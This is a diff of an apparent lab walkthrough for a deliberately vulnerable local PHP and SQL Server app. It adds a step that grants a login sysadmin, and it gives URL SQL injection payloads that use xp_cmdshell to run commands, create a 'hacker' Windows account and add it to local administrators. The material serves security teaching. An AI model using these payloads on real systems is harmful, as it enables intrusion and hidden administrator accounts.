@@ -61,21 +61,46 @@ Database applications like MySQL, MS SQL, and Oracle can execute system commands
    The data can be found by expanding the Tables Node located under the master node
    ![image](https://github.com/user-attachments/assets/18dcc7d3-e34c-4ac2-a104-db3571d3170e)
 8. Download and install Microsoft ODBC Driver for SQL Server (x64) in the reference link above. After installation, test the web app in localhost. If it does not work, repair the ODBC Driver by reinstalling and choose repair
-9. In the web app, add `?id=1` at the end of the URL to check and retrieve data with ID = 1 stored in the database table
-10. To inject `xp_cmdshell` into the query, use a dynamic SQL within the query as the following. The SQL Server interprets and run a dynamic SQL string which would not be blocked in a standard SQL query
+9. To give admin privileges to the SQL Server account, it needs to be added to the `sysadmin` role (highest-level admin role in SQL). However, the SQL account username needs to be known first, and can be identified using
+   ```
+   SELECT name 
+   FROM sys.syslogins 
+   WHERE type_desc = 'SQL_LOGIN';
+   ```
+   or either one of these commands
+   ```
+   SELECT USER_NAME();
+   SELECT CURRENT_USER;
+   ```
+   Then to use SQL Query to grant `sysadmin` privileges, run
+   ```
+   EXEC sp_addsrvrolemember 'username', 'sysadmin';
+   ```
+   To verify the privileges, run
+   ```
+   SELECT name, type_desc, is_disabled 
+   FROM sys.server_principals 
+   WHERE type_desc = 'SQL_LOGIN' AND name = 'username';
+   ```
+   or
+   ```
+   SELECT * FROM sys.syslogins WHERE name = 'username';
+   ```
+10. In the web app, add `?id=1` at the end of the URL to check and retrieve data with ID = 1 stored in the database table
+11. To inject `xp_cmdshell` into the query, use a dynamic SQL within the query as the following. The SQL Server interprets and run a dynamic SQL string which would not be blocked in a standard SQL query
     ```
     http://localhost/vulnsql/vuln.php?id=1'; EXEC sp_executesql N'EXEC xp_cmdshell(''whoami'')';--
     ```
-11. To use SQL injection to create a new user `hacker` with password `hacked1337`, use the following SQL injection strings at the end of the web app's URL
+12. To use SQL injection to create a new user `hacker` with password `hacked1337`, use the following SQL injection strings at the end of the web app's URL
     ```
     ?id=1'; EXEC sp_executesql N'EXEC xp_cmdshell(''net user hacker hacked1337 /add'')';--
     ```
-12. To add this user to the local administrators group, add the following
+13. To add this user to the local administrators group, add the following
     ```
     ?id=1'; EXEC sp_executesql N'EXEC xp_cmdshell(''net localgroup administrators hacker /add'')';--
     ```
-13. To verify `hacker` was added, check using the SQL injection string
+14. To verify `hacker` was added, check using the SQL injection string
     ```
     ?id=1'; EXEC sp_executesql N'EXEC xp_cmdshell(''whoami'')';--
     ```
-14. 
+15. 
